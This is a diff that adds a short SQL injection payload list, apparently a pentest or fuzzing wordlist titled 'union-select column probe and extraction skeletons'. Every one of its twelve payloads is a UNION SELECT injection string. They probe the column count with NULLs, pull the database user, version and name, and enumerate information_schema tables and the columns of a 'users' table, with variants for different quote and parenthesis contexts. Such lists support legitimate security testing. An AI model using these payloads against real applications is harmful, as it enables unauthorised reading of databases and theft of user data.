@@ -1,0 +1,13 @@
+# sqli/union-select — column probe + extraction skeletons
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT user(),version(),database() --
+' UNION SELECT table_name,NULL FROM information_schema.tables --
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
+') UNION SELECT NULL,NULL --
+" UNION SELECT NULL,NULL --
+1) UNION SELECT NULL,NULL --
+1)) UNION SELECT NULL,NULL --
